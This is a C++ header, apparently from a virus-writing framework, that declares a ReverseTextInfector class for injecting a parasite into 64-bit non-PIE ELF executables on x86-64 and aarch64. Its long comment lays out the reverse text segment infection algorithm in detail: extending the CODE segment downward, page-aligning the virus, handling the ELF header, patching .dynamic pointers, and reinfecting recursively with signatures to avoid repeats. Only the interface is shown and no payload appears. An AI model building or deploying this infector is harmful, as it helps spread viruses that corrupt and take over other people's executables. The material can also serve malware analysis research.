#pragma once
#include <elf.h>
#include <optional>
#include <span>
#include "infector/injection_result.hh"

namespace vf::infector {
// This method was discussed by Silvio but no working prototype was provided.
// The following code implements the algorithm to work with 64-bit EXEC binaries
// for both aarch64 and x86-64.
// The main idea is to extend the CODE segment's vaddr starting point backwards
// (downwards) to accommodate the virus. Depending on the starting address of
// CODE (on most 64 bit systems with default linker script it starts at
// 0x400000) we maybe able to inject a relative huge virus, compared to text
// padding infection. This algorithm is also carefully crafted to handle special
// cases when the victim's CODE segment starts from offset zero, where the
// insertion point must be adjusted to leave space for the Elf header structure.
// The normal happy case (hopefully the linker default) usually has a read-only
// segment preceding CODE, which has a non-zero file offset.
//
// Inserting to zero offset CODE segment:
//  host elf structure                           infected elf structure
//  -------------------                          -----------------------
//  elf_hdr            <------|    |----->       elf_hdr
//  phdrs                 CODE|    |CODE         *virus <---------
//  non-exec sections         |    |             phdrs
//  exec sections      <------|    |             non-exec sections
//  non-exec sections              |----->       exec sections
//  shdrs                                        non-exec sections
//                                               shdrs
//
// Non-zero offset CODE segment:
//  host elf structure                           infected elf structure
//  -------------------                          -----------------------
//  elf_hdr                                      elf_hdr
//  phdrs                                        phdrs
//  non-exec sections                            non-exec sections
//  exec sections      <--CODE     |CODE-->      *virus <---------
//  non-exec sections              |----->       exec sections
//  shdrs                                        non-exec sections
//                                               shdrs
//
// The insertion choice is simply, as we have to append to the beginning of CODE
// in order to extend vaddr backwards. The only difference is the former needs
// to do a little bit more work to accommodate the elf header and make the virus
// rodata relocation safe.
//
// Another modification of this infection algorithm is that we pad the virus to
// always start at page aligned address/offset so that it makes virus rodata
// relocation safe on aarch64, at the expense of a slightly larger binary (4k
// larger at most). This is important for viruses that merges .text and
// .rodata on aarch64. Although x86-64 doesn't care, we bake this in for both
// arch to reduce algorithm complexity.
//
// This is achieved by padding the virus to accommodate the elf header structure
// if the original CODE segment starts from zero file offset:
//
// |Elf Header|============|      virus       |=============| original CODE
//            | padding    |page  |page  |page  | padding   |page
//
// As you can see, the tail is also padded to ensure the original CODE is
// aligned (again not a requirement for x86-64 but we do this by default).
//
// Another important piece to make this algorithm work is to shift the pointers
// inside the .dynamic section, as they no longer point to to correct vaddr
// after virus insertion.
//
// Note that this algorithm is safe to recursively infect the victim, as long as
// the vaddr space is not exhausted (the lowest address we can reverse into is
// decided by the mmap_min_addr kernel configuration). It's recommended to use
// an infection signature to avoid this.
//
// Sadly this algorithm so far only works for non-pie's. Nonetheless, if a
// victim is found, it could potentially fit a large virus with an added bonus
// of being rodata relocation safe. It's a good choice targeting non-PIEs but as
// newer gcc versions start building PIEs by default, this algorithm might fade
// into history books.
class ReverseTextInfector {
 public:
  // Return the size of the binary after a successful infection. This algorithm
  // will increase the file size.
  size_t injected_host_size() const;

  // Scan the elf to see if it can be injected with a parasite by extending the
  // text segment in reverse order.
  // @param host_mapping The host elf mapping.
  // @param parasite_size The size of the parasite.
  // @return True if the host binary can be injected.
  bool analyze(std::span<const std::byte> host_mapping,
               std::span<const std::byte> parasite_mapping);

  std::optional<InjectionResult> inject(
      std::span<std::byte> host_mapping,
      std::span<const std::byte> parasite_mapping);

 private:
  size_t host_size_{};
  size_t parasite_size_{};
  // This is the virus size plus padding both before and after the virus. We
  // insert this blob as a whole.
  size_t padded_virus_size_{};
  Elf64_Addr original_e_entry_{};
  Elf64_Addr original_code_segment_p_vaddr_{};
  Elf64_Addr parasite_load_address_{};
  Elf64_Off original_code_segment_file_offset_{};
  size_t code_segment_idx_{};
};

}  // namespace vf::infector